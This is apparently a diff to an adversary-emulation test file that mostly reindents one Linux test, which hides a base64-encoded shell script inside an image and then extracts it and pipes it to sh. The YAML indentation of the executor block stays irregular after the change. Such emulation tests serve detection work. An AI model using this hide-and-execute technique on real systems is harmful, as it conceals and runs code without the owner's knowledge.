@@ -148,29 +148,30 @@ atomic_tests:
         Remove-Item -Path "$HOME\decoded.ps1" -Force -ErrorAction Ignore
   
   - name: Execute Embedded Script in Image via Steganography
-  description: |
+    auto_generated_guid:
+    description: |
      This atomic test demonstrates the execution of an embedded script in an image file using steganography techniques. The script is first encoded in base64 and then 
      embedded within the pixels of the image. The modified image is created, and the script is extracted and executed on the target system.
-  supported_platforms:
-    - linux
-  input_arguments:
-     image:
-       description: "Image file to be embedded"
-       type: path
-       default: PathToAtomicsFolder/image.jpg
-     script:
-       description: "Shell Script file to be embedded and executed"
-       type: path
-       default: PathToAtomicsFolder/script.sh
-     evil_image:
-       description: "The modified image with embedded script"
-       type: path
-       default: PathToAtomicsFolder/evil_image.jpg
-  executor:
-      name: sh
-        elevation_required: false
-      command: |
-         cat "#{script}" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "#{image}" - > "#{evil_image}"
-         strings "#{evil_image}" | tail -n 1 | base64 -d | sh
-      cleanup_command: |
-         rm "#{evil_image}"
+    supported_platforms:
+     - linux
+    input_arguments:
+      image:
+        description: "Image file to be embedded"
+        type: path
+        default: PathToAtomicsFolder/image.jpg
+      script:
+        description: "Shell Script file to be embedded and executed"
+        type: path
+        default: PathToAtomicsFolder/script.sh
+      evil_image:
+        description: "The modified image with embedded script"
+        type: path
+        default: PathToAtomicsFolder/evil_image.jpg
+     executor:
+       name: sh
+         elevation_required: false
+       command: |
+          cat "#{script}" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "#{image}" - > "#{evil_image}"
+          strings "#{evil_image}" | tail -n 1 | base64 -d | sh
+       cleanup_command: |
+          rm "#{evil_image}"
